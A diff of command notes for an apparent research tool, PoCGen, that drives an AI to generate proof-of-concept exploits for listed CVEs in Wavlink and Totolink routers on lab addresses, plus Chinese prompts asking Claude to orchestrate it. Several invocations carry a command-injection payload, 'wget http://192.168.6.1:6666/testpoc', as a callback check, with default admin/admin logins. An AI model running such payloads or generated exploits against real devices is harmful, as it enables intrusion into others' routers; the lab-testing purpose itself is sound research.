@@ -1,26 +1,26 @@
 WL-NU516U1
 CVE-2025-9149
 python3 -m PoCGen.cli \
-  --desc /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/desc.txt \
-  --code "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/*.c" \
-  --target http://192.168.6.2 \
+  --desc ./testdata/Wavlink_WLNU516/CVE-2025-9149/desc.txt \
+  --code "./testdata/Wavlink_WLNU516/CVE-2025-9149/相关函数/*.c" \
+  --target http://192.168.6.3 \
+  --CVENumber CVE-2025-9149 \
   --probe-target --browser-login \
-  --login-url http://192.168.6.2 \
+  --login-url http://192.168.6.3 \
   --login-username admin --login-password admin \
   --auto-validate --max-iters 5 \
   --payload "wget http://192.168.6.1:6666/testpoc"
 
-idalib-mcp /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/漏洞文件/wireless.cgi
+idalib-mcp ./testdata/Wavlink_WLNU516/CVE-2025-9149/漏洞文件/wireless.cgi
 
 python3 -m PoCGen.cli \
-  --desc /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/desc.txt \
-  --code "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/*.c" \
-  --target http://192.168.6.2 \
+  --desc ./testdata/Wavlink_WLNU516/CVE-2025-9149/desc.txt \
+  --code "./testdata/Wavlink_WLNU516/CVE-2025-9149/相关函数/*.c" \
+  --target http://192.168.6.3 \
   --CVENumber CVE-2025-9149 \
-  --binary /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/漏洞文件/wireless.cgi \
-  --ida-mcp-url http://127.0.0.1:8745/mcp \
+  --binary ./testdata/Wavlink_WLNU516/CVE-2025-9149/漏洞文件/wireless.cgi \
   --probe-target --browser-login \
-  --login-url http://192.168.6.2 \
+  --login-url http://192.168.6.3 \
   --login-username admin --login-password admin \
   --auto-validate --max-iters 5 \
   --payload "wget http://192.168.6.1:6666/testpoc"
@@ -38,10 +38,10 @@ curl -sS -o /tmp/chat.json -w "status=%{http_code} time=%{time_total}s\n" \
   -d '{"model":"glm-5.1-fp8","messages":[{"role":"user","content":"reply pong"}],"temperature":0,"max_tokens":128}'
 
   python3 -m PoCGen.cli \
-  --desc /home/li/test_env/second_data/TotolinkA3300R/CVE-2024-24325/desc.txt \
-  --code "/home/li/test_env/second_data/TotolinkA3300R/CVE-2024-24325/相关函数/*.c" \
+  --desc ./testdata/TotolinkA3300R/CVE-2023-37170/desc.txt \
+  --code "./testdata/TotolinkA3300R/CVE-2023-37170/相关函数/*.c" \
   --target http://192.168.6.2 \
-  --CVENumber CVE-2024-24325 \
+  --CVENumber CVE-2023-37170 \
   --probe-target --browser-login \
   --login-url http://192.168.6.2 \
   --login-username admin --login-password admin \
@@ -49,12 +49,39 @@ curl -sS -o /tmp/chat.json -w "status=%{http_code} time=%{time_total}s\n" \
   --payload "wget http://192.168.6.1:6666/testpoc"
 
 python3 -m PoCGen.cli \
-  --desc /home/li/test_env/second_data/TotolinkA3300R/CVE-2026-5176/desc.txt \
-  --code "/home/li/test_env/second_data/TotolinkA3300R/CVE-2026-5176/相关函数/*.c" \
-  --target http://192.168.6.2 \
+  --desc ./testdata/TotolinkA3300R/CVE-2026-5176/desc.txt \
+  --code "./testdata/TotolinkA3300R/CVE-2026-5176/相关函数/*.c" \
+  --target http://192.168.6.2/login.html \
   --CVENumber CVE-2026-5176 \
   --probe-target --browser-login \
-  --login-url http://192.168.6.2 \
+  --login-url http://192.168.6.2/login.html \
   --login-username admin --login-password admin \
   --auto-validate --max-iters 5 \
   --payload "wget http://192.168.6.1:6666/testpoc"
+
+
+帮我为 CVE-2024-24325 生成 PoC。
+漏洞描述在 ./testdata/TotolinkA3300R/CVE-2024-24325/desc.txt，相关源码在 ./testdata/TotolinkA3300R/CVE-2024-24325/相关函数/*.c，相关二进制文件在
+目标是 http://192.168.6.2，需要先用浏览器登录（admin/admin），然后探测目标。
+成功后用 wget http://192.168.6.1:6666/testpoc 验证，自动重试最多 5 次，直到收到回调，并展示poc。
+全程不要使用联网搜索，仅靠你的能力分析生成poc
+
+帮我为 CVE-2024-23058 生成 PoC。
+漏洞描述在 ./testdata/TotolinkA3300R/CVE-2024-23058/desc.txt，相关源码在 ./testdata/TotolinkA3300R/CVE-2024-23058/相关函数/*.c，相关二进制文件在
+目标是 http://192.168.6.2，需要先用浏览器登录（admin/admin），然后探测目标。
+成功后用 wget http://192.168.6.1:6666/testpoc 验证，自动重试最多 5 次，直到收到回调，并展示poc。
+全程不要使用联网搜索，仅靠你的能力分析生成poc
+
+使用claude的编排能力，调用pocgen项目，帮我为如下设备漏洞生成PoC：
+testdata/TotolinkA3300R
+testdata/Wavlink_WLNU516
+testdata/Wavlink_WLWN578W2
+testdata/Wavlink_WLWN579A3
+testdata/设备IP对应表.md
+每个cve目录下，漏洞描述在desc.txt，相关源码在相关函数/*.c，部分漏洞存在二进制文件
+设备web目标是 http://192.168.6.2/3/4/5，需要先用浏览器登录（账号密码admin/admin），然后探测目标,以得到目标网页的报文格式参考。
+随后后用payload wget http://192.168.6.1:6666/CVENumber 验证，如果monitor出现对应cvenumber请求证明成功，自动重试最多 5 次，直到收到wget请求。
+最后将成功收到回复的poc报文保存，如果错误也记录这次任务中的所有报文，最后分析失败原因总结。
+形成测试报告，统计成功率,一边测试一边记录
+全程不要使用联网搜索，仅靠你的能力分析生成poc。
+串行验证每个漏洞，将测试步骤记录
